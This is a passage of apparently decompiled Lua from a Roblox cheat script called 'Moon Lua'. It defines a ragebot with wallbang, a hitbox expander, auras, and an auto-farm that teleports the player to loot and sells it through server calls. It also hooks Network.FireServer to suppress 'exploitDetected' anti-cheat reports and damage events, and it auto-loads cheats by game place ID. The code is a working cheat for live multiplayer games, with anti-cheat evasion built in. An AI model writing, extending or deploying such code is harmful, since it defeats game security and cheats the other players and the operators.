								Default = RageState.AutoEquip.Enabled,
								Callback = function(enabled)
									RageState.AutoEquip.Enabled = enabled
								end,
							})

							v30:CreateKeybind({
								Id = "w-auto-equip-keybind",
								Name = "Keybind",
								Callback = function()
									v30:Set(not v30:Get())
								end,
							})

							autoEquipSelector = v30:CreateSelector({
								Id = "w-auto-equip-item",
								Name = "Item",
								Options = fn75(),
								Default = RageState.AutoEquip.Item,
								Callback = function(item)
									RageState.AutoEquip.Item = item
								end,
							})

							v30:CreateButton({ Id = "w-refresh-items", Name = "Refresh Items", Callback = fn91 })

							local v31 = v28:CreateModule({
								Id = "wanted-ragebot",
								Name = "Ragebot",
								Default = RageState.Ragebot.Enabled,
								Callback = function(enabled)
									RageState.Ragebot.Enabled = enabled
								end,
							})

							v31:CreateKeybind({
								Id = "w-ragebot-keybind",
								Name = "Keybind",
								Callback = function()
									v31:Set(not v31:Get())
								end,
							})

							v31:CreateToggle({
								Id = "w-wallbang",
								Name = "Wallbang",
								Default = RageState.Ragebot.Wallbang,
								Callback = function(wallbang)
									RageState.Ragebot.Wallbang = wallbang
								end,
							})

							v31:CreateToggle({
								Id = "w-ignore-crawling",
								Name = "Ignore Crawling",
								Default = RageState.Ragebot.Ignore.Crawling,
								Callback = function(crawling)
									RageState.Ragebot.Ignore.Crawling = crawling
								end,
							})

							v31:CreateToggle({
								Id = "w-ignore-knocked",
								Name = "Ignore Knocked",
								Default = RageState.Ragebot.Ignore.Knocked,
								Callback = function(knocked)
									RageState.Ragebot.Ignore.Knocked = knocked
								end,
							})

							v31:CreateToggle({
								Id = "w-ignore-grabbed",
								Name = "Ignore Grabbed",
								Default = RageState.Ragebot.Ignore.Grabbed,
								Callback = function(grabbed)
									RageState.Ragebot.Ignore.Grabbed = grabbed
								end,
							})

							local v32 = v28:CreateModule({
								Id = "wanted-finish-arrest-aura",
								Name = "Finish/ArrestAura",
								Default = RageState.Finish_ArrestAura,
								Callback = function(finishArrestAura)
									RageState.Finish_ArrestAura = finishArrestAura
								end,
							})

							v32:CreateKeybind({
								Id = "w-finish-arrest-keybind",
								Name = "Keybind",
								Callback = function()
									v32:Set(not v32:Get())
								end,
							})

							local v33 = v28:CreateModule({
								Id = "wanted-save-aura",
								Name = "Save Aura",
								Default = RageState.SaveAura,
								Callback = function(saveAura)
									RageState.SaveAura = saveAura
								end,
							})

							v33:CreateKeybind({
								Id = "w-save-aura-keybind",
								Name = "Keybind",
								Callback = function()
									v33:Set(not v33:Get())
								end,
							})

							local v34 = v28:CreateModule({
								Id = "wanted-hitbox",
								Name = "Hitbox",
								Default = RageState.Hitbox.Enabled,
								Callback = function(enabled)
									RageState.Hitbox.Enabled = enabled

									if not enabled then
										fn93()
									end
								end,
							})

							v34:CreateKeybind({
								Id = "w-hitbox-keybind",
								Name = "Keybind",
								Callback = function()
									v34:Set(not v34:Get())
								end,
							})

							v34:CreateSelector({
								Id = "w-hitbox-part",
								Name = "Part",
								Options = { { Value = "Head" }, { Value = "Body" } },
								Default = RageState.Hitbox.Part,
								Callback = function(part)
									RageState.Hitbox.Part = part
								end,
							})

							v34:CreateSlider({
								Id = "w-hitbox-size",
								Name = "Size",
								Min = 1,
								Max = 30,
								Default = RageState.Hitbox.Size,
								Step = 1,
								Callback = function(size)
									RageState.Hitbox.Size = size
								end,
							})

							fn91()
							fn97()
							local v35 = v14:CreateTab({ Id = "wanted-farm", Name = "Farm" })
							local tween = nil
							local v36 = nil
							local tbl11 = {}
							local v37 = NewCFrame(-387, 612, -1194)
							local v38 = NewCFrame(-3139, 36, 1638)
							local v39 = NewCFrame(212.04666, 39.775333, -2917.91455)
							local v40 = NewCFrame(-1677.875, 181.219955, 3336.449707)
							local v41 = NewCFrame(-490.56213, 128.077621, -1677.27356)
							local v42 = NewCFrame(-940.75396, 73.954681, -1541.64379)
							local v43 = NewCFrame
							tbl11[1] = v37
							tbl11[2] = v38
							tbl11[3] = v39
							tbl11[4] = v40
							tbl11[5] = v41
							tbl11[6] = v42

							do
								local values = table.pack(v43(-484.20837, 44.178874, -1956.65234))
								table.move(values, 1, values.n, 7, tbl11)
							end

							local tbl12 = {
								FarmAura = {
									Enabled = false,
									Options = {
										"GasStationSafe",
										"ATM",
										"Register",
										"Lootable",
										"WorldItem",
										"WorldBag",
										"MainCashPile",
										"CashPallet",
										"Cash",
										"MilitaryChest",
										"PelicanCase",
										"WorldSafe",
										"PC Block",
										"WorldItemSpawn",
										"Break Glass",
									},
								},
								AutoFarm = {
									Enabled = false,
									Options = {
										"GasStationSafe",
										"ATM",
										"Register",
										"Lootable",
										"WorldItem",
										"WorldBag",
										"MainCashPile",
										"CashPallet",
										"Cash",
										"MilitaryChest",
										"PelicanCase",
										"WorldSafe",
										"PC Block",
										"WorldItemSpawn",
									},
								},
							}

							local tbl13 = nil
							local flag = false

							local function fn98(arg)
								if not flag then
									tbl13 = {}
									flag = true
									local fn99 = nil

									fn99 = function(arg2)
										local v44 = GetChildren(arg2)

										for i = 1, #v44 do
											local v45 = v44[i]

											if IsA(v45, "ModuleScript") then
												local ok4, result4 = pcall(require, v45)

												if ok4 and type(result4) == "table" and result4.name and type(result4.sellValue) == "number" then
													tbl13[result4.name] = result4.sellValue
												end
											elseif IsA(v45, "Folder") then
												fn99(v45)
											end
										end
									end

									pcall(fn99, ReplicatedStorage.Shared.Wanted.Indicies.Objects.Gizmos.Pickups.Lootable)
								end

								return tbl13[arg]
							end

							local function fn99(arg)
								if fn81(arg) then
									local v44 = fn82(arg)
									if type(v44) == "number" then
										return v44
									end
								end

								local sellValue = arg and arg.sellValue

								if type(sellValue) ~= "number" then
									sellValue = fn98(arg and arg.name)
								end

								return sellValue or 0
							end

							local function fn100(arg)
								return fn84(arg)
							end

							local function fn101(arg, arg2, arg3)
								if not fn100(arg) or not fn78(arg2, arg.gizmoType) then
									return false
								end

								if fn85(arg) and not arg3 then
									return false
								end
								return true
							end

							local function fn102()
								if tween then
									tween:Cancel()
									tween = nil
								end
							end

							local function fn103(arg)
								return TweenInfo.new(arg, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut)
							end

							local function fn104(arg, arg2, arg3)
								fn102()
								tween = TweenService:Create(arg, arg2, arg3)
								tween:Play()
								tween.Completed:Wait()
								tween = nil
							end

							local function fn105()
								local v44 = fn71()
								if not v44 then
									return
								end
								local flag2 = fn74("Buzzsaw") ~= nil

								if fn78(tbl12.FarmAura.Options, "Break Glass") and flag2 then
									local v45 = fn86(v44, 10)

									if v45 then
										fn87(v45)
									end
								end

								local tbl14 = {}
								local tbl15 = {}
								local v45 = next
								local v46, v47 = fn79(v44)

								for _, v48 in v45, v46, v47 do
									if v48.dist < n5 and fn101(v48, tbl12.FarmAura.Options, flag2) then
										if fn81(v48) then
											Insert(tbl15, v48)
										else
											Insert(tbl14, v48)
										end
									end
								end

								for i = 1, #tbl15 do
									fn83(tbl15[i])
								end

								Sort(tbl14, function(arg, arg2)
									local v48 = fn99(arg)
									local v49 = fn99(arg2)
									if v48 ~= v49 then
										return v48 > v49
									end
									return arg.dist < arg2.dist
								end)

								for i = 1, Min(3, #tbl14) do
									local v48 = tbl14[i]

									if fn85(v48) then
										local v49 = fn86(v44, 10)

										if v49 then
											fn87(v49)
										end
									end

									fn83(v48)
								end
							end

							local function fn106()
								local v44 = fn71()
								local v45 = GetAttribute(LocalPlayer, "hasLootBag")
								local n7 = 0

								pcall(function()
									n7 = DialogUtil.GetBagSellValue() or 0
								end)

								if not v44 or not v45 and n7 <= 0 then
									return false
								end
								fn104(v44, fn103(1), { CFrame = v44.CFrame + NewVector3(0, 150, 0) })
								if not tbl12.AutoFarm.Enabled then
									return true
								end
								local v46 = fn71()
								if not v46 then
									return true
								end
								local v47 = NewVector3(-2826, v46.Position.Y, 1738)
								fn104(v46, fn103((v46.Position - v47).Magnitude / 100), { CFrame = NewCFrame(v47) })
								if not tbl12.AutoFarm.Enabled then
									return true
								end
								local v48 = fn71()
								if not v48 then
									return true
								end
								fn104(v48, fn103(3), { CFrame = NewCFrame(-2826, 37, 1738) })
								pcall(invokeServer, "sellLoot", "Ofy")
								return true
							end

							local function fn107()
								local v44 = fn71()
								local v45 = fn70()
								if not v44 or not v45 then
									return
								end
								fn106()
								if not tbl12.AutoFarm.Enabled then
									return
								end
								local v46 = fn71()
								if not v46 then
									return
								end
								local v47 = tbl11[Random(1, #tbl11)]
								fn104(v46, fn103(1), { CFrame = v46.CFrame + NewVector3(0, 150, 0) })
								if not tbl12.AutoFarm.Enabled then
									return
								end
								local v48 = fn71()
								if not v48 then
									return
								end
								local v49 = NewVector3(v47.X, v48.Position.Y, v47.Z)
								fn104(v48, fn103((v48.Position - v49).Magnitude / 100), { CFrame = NewCFrame(v49) })
								local v50 = fn71()
								if not v50 then
									return
								end
								local flag2 = fn74("Buzzsaw") ~= nil
								local tbl14 = {}
								local v51 = next
								local v52, v53 = fn79(v50)

								for _, v54 in v51, v52, v53 do
									if fn101(v54, tbl12.AutoFarm.Options, flag2) then
										Insert(tbl14, v54)
									end
								end

								Sort(tbl14, function(arg, arg2)
									local v54 = fn99(arg)
									local v55 = fn99(arg2)
									if v54 ~= v55 then
										return v54 > v55
									end
									return arg.dist < arg2.dist
								end)

								for i = 1, #tbl14 do
									local v54 = tbl14[i]

									if tbl12.AutoFarm.Enabled then
										if fn89() then
											fn106()
											break
										else
											local v55 = fn71()

											if v55 then
												local n7 = v54.cframe and v54.cframe * NewCFrame(0, 1, -1) or NewCFrame(v54.position)
												fn104(v55, fn103(Max((v55.Position - n7.Position).Magnitude / 60, 0.05)), { CFrame = n7 })
												local gizmoType, flag3, n8

												if fn85(v54) then
													if not flag2 then
														continue
													else
														local v56 = fn86(v55, 12)

														if v56 then
															fn87(v56)
															Wait(0.35)
															fn83(v54)
															gizmoType = v54.gizmoType
															flag3 = gizmoType == "ATM" or gizmoType == "Register"
															n8 = 0.6

															if flag3 then
																n8 = 2.5
															end

															Wait(n8)

															if fn89() then
																fn106()
																break
															else
																continue
															end
														else
															fn83(v54)
															gizmoType = v54.gizmoType
															flag3 = gizmoType == "ATM" or gizmoType == "Register"
															n8 = 0.6

															if flag3 then
																n8 = 2.5
															end

															Wait(n8)

															if fn89() then
																fn106()
																break
															else
																continue
															end
														end
													end
												else
													fn83(v54)
													gizmoType = v54.gizmoType
													flag3 = gizmoType == "ATM" or gizmoType == "Register"
													n8 = 0.6

													if flag3 then
														n8 = 2.5
													end

													Wait(n8)

													if fn89() then
														fn106()
														break
													else
														continue
													end
												end
											end
										end
									end

									break
								end
							end

							local function fn108()
								if v36 then
									return
								end

								v36 = Spawn(function()
									while tbl12.AutoFarm.Enabled and Wait() do
										pcall(fn107)
									end

									fn102()
									v36 = nil
								end)
							end

							Connect(RunService.Heartbeat, function()
								if tbl12.FarmAura.Enabled then
									fn105()
								end
							end)

							local function fn109(arg, arg2, arg3)
								if arg3 then
									if not Find(arg, arg2) then
										Insert(arg, arg2)
									end
								else
									for i = #arg, 1, -1 do
										if arg[i] == arg2 then
											Remove(arg, i)
										end
									end
								end
							end

							local tbl14 = {
								"GasStationSafe",
								"ATM",
								"Register",
								"Lootable",
								"WorldItem",
								"WorldBag",
								"MainCashPile",
								"CashPallet",
								"Cash",
								"MilitaryChest",
								"PelicanCase",
								"WorldSafe",
								"PC Block",
								"WorldItemSpawn",
							}

							local tbl15 = {
								"GasStationSafe",
								"ATM",
								"Register",
								"Lootable",
								"WorldItem",
								"WorldBag",
								"MainCashPile",
								"CashPallet",
								"Cash",
								"MilitaryChest",
								"PelicanCase",
								"WorldSafe",
								"PC Block",
								"WorldItemSpawn",
								"Break Glass",
							}

							local v44 = v35:CreateModule({
								Id = "wanted-farm-aura",
								Name = "Farm Aura",
								Default = tbl12.FarmAura.Enabled,
								Callback = function(enabled)
									tbl12.FarmAura.Enabled = enabled
								end,
							})

							for i = 1, #tbl15 do
								local v45 = tbl15[i]

								v44:CreateToggle({
									Id = "w-fa-" .. Lower(v45:gsub("%s+", "-")),
									Name = v45,
									NameKey = "w_fa_" .. Lower(v45:gsub("%s+", "_")),
									Default = Find(tbl12.FarmAura.Options, v45) ~= nil,
									Callback = function(arg)
										fn109(tbl12.FarmAura.Options, v45, arg)
									end,
								})
							end

							local v45 = v35:CreateModule({
								Id = "wanted-auto-farm",
								Name = "Auto Farm",
								Default = tbl12.AutoFarm.Enabled,
								Callback = function(enabled)
									tbl12.AutoFarm.Enabled = enabled

									if enabled then
										fn108()
									else
										fn102()
									end
								end,
							})

							for i = 1, #tbl14 do
								local v46 = tbl14[i]

								v45:CreateToggle({
									Id = "w-af-" .. Lower(v46:gsub("%s+", "-")),
									Name = v46,
									NameKey = "w_af_" .. Lower(v46:gsub("%s+", "_")),
									Default = Find(tbl12.AutoFarm.Options, v46) ~= nil,
									Callback = function(arg)
										fn109(tbl12.AutoFarm.Options, v46, arg)
									end,
								})
							end

							local v46 = v14:CreateTab({ Id = "wanted-misc", Name = "Wanted Misc" })
							local tbl16 = { NoVehicleHits = true, NoBankGas = true, NoBankTripLaser = true, NoRagdoll = true }

							v46:CreateModule({
								Id = "wanted-no-vehicle-hits",
								Name = "No Vehicle Hits",
								Default = tbl16.NoVehicleHits,
								Callback = function(noVehicleHits)
									tbl16.NoVehicleHits = noVehicleHits
								end,
							})

							v46:CreateModule({
								Id = "wanted-no-bank-gas",
								Name = "No Bank Gas",
								Default = tbl16.NoBankGas,
								Callback = function(noBankGas)
									tbl16.NoBankGas = noBankGas
								end,
							})

							v46:CreateModule({
								Id = "wanted-no-bank-trip-laser",
								Name = "No Bank Trip Laser",
								Default = tbl16.NoBankTripLaser,
								Callback = function(noBankTripLaser)
									tbl16.NoBankTripLaser = noBankTripLaser
								end,
							})

							v46:CreateModule({
								Id = "wanted-no-ragdoll",
								Name = "No Ragdoll",
								Default = tbl16.NoRagdoll,
								Callback = function(noRagdoll)
									tbl16.NoRagdoll = noRagdoll
								end,
							})

							local fireServer2 = Network.FireServer

							Network.FireServer = function(arg, ...)
								local v47 = table.pack(...)
								if arg == "exploitDetected" or arg == "registerVehicleHits" and tbl16.NoVehicleHits or arg == "gassed" and tbl16.NoBankGas or arg == "tripLaser" and tbl16.NoBankTripLaser or arg == "setRagdoll" and ({ ... })[1] == true and tbl16.NoRagdoll then
									return
								end
								return fireServer2(arg, table.unpack(v47, 1, v47.n))
							end
						end,
					}

					local flag = false
					local placeId = game.PlaceId

					local tbl10 = {
						["Gun Grounds FFA"] = 12137249458,
						Ohio = { 7239319209, 11958318242 },
						["Ultimate Battlegrounds"] = { 11815767793, 101993432229107 },
						Wanted = 14438406081,
						Blackout = { 18243214051, 15432890326, 137064773215574 },
						Defusal = 79393329652220,
						["Block Spin"] = { 97556409405464 },
						Gakuran = 128736949265057,
						["Blade Ball"] = 4777817887,
					}

					for k, v27 in pairs(tbl10) do
						if typeof(v27) == "table" then
							for _, v28 in ipairs(v27) do
								if placeId == v28 then
									handlers[k]()
									flag = true
									break
								end
							end
						elseif placeId == v27 then
							handlers[k]()
							flag = true
						end

						if not flag then
							continue
						end
						break
					end

					if not flag then
						local v27 = v26:CreateModule({
							Id = "autoload-manual-load",
							Name = "Manual Load",
							NameKey = "Settings.ManualLoad.Module",
						})

						for k in pairs(tbl10) do
							v27:CreateButton({
								Id = "manual-load-" .. k,
								Name = k,
								NameKey = "manual-load-" .. k,
								Callback = function()
									handlers[k]()
									flag = true
								end,
							})
						end
					end

					fn7({ Title = "Moon Lua", Text = "Loaded", Duration = 5 })

					if autoloadcfg then
						loadcfg(autoloadcfg)
					end

					return
				end

				while true do
					Wait()
				end
			else
				fn6("Login Failed2", result3)

				while true do
					Wait()
				end
			end
		end
	end
end
